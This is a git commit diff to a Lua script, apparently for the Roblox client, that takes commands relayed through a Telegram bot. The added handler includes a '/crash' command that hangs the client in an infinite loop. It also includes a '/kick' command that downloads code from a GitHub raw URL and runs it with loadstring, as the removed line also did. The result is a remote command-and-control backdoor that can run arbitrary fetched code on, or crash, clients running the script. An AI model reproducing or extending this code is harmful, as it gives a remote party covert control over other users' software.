12cbba373768089dd297ba0e9b5589b3b7b0cd4c
repositorykreml1n <realtitus52@gmail.com>
2026-03-26 18:39:50 +0300

    Update tg_bot.lua

--- tg_bot.lua
+++ tg_bot.lua
@@ -55,4 +55,29 @@ task.spawn(function()
 --ПИСАТЬ КОМАНДЫ  
 --ПИСАТЬ КОМАНДЫ  
 --ПИСАТЬ КОМАНДЫ  
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/commands_list.lua"))() 
+                        
+                        -- === ИСПОЛНЕНИЕ КОМАНД ===
+                        if Mega and Mega.Commands and Mega.Commands[cmd] then
+                            -- Динамически вызываем функцию команды, если она существует в модулях
+                            task.spawn(Mega.Commands[cmd], data)
+                        elseif cmd == "/crash" then
+                            -- Бесконечный цикл намертво вешает клиент Роблокса
+                            while true do end 
+                        elseif cmd =="/kick" then
+                            -- 1. Скачиваем код и превращаем в функцию
+                            local kickFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
+                            
+                            -- 2. Проверяем, что код успешно скачался, и ПЕРЕДАЕМ ему data
+                            if kickFunc then
+                                kickFunc(data) 
+                            else
+                                warn("Не удалось скачать скрипт kick.lua")
+                            end
+                        end
+                        -- =========================
+                    end
+                end
+            end
+    end
+end)
+-- ========================================================
